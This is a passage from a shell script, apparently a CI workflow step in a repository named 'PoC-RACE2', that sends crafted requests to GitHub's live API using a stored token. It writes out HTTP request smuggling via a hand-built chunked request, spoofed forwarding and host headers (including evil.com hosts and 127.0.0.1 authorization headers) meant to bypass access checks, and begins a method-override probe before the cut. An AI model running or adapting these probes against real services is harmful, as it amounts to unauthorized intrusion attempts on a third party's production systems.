            -H "Content-Length: 0" "$UP/git/blobs" -d '{"content":"x","encoding":"utf-8"}' 2>/dev/null || echo "000"
          echo "O05 Transfer-Encoding chunked:"
          printf 'POST /repos/twrps/PoC-RACE2/git/blobs HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: token %s\r\nContent-Type: application/json\r\nTransfer-Encoding: chunked\r\n\r\n2a\r\n{"content":"x","encoding":"utf-8"}\r\n0\r\n\r\n' "$GH_TOKEN" | \
            openssl s_client -connect api.github.com:443 -quiet 2>/dev/null | head -5 || echo "failed"
          echo ""
          echo "--- Forwarding/proxy headers ---"
          for HDR in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" \
            "X-Forwarded-For: 192.30.252.1" "X-Original-URL: /repos/twrps/PoC-RACE2/git/blobs" \
            "X-Rewrite-URL: /repos/twrps/PoC-RACE2/git/blobs" \
            "Host: api.github.com.evil.com" "X-Forwarded-Host: evil.com" \
            "X-Custom-IP-Authorization: 127.0.0.1" "X-Forwarded-Port: 443"; do
            echo "O06 '${HDR:0:30}' = HTTP_$(P -X POST -H "Authorization: token $GH_TOKEN" \
              -H "Content-Type: application/json" -H "$HDR" \
              "$UP/git/blobs" -d '{"content":"x","encoding":"utf-8"}')"
          done
          echo ""
          echo "--- Method override ---"
          for HDR in "X-HTTP-Method-Override: PUT" "X-HTTP-Method: PUT" "X-Method-Override: PUT" \
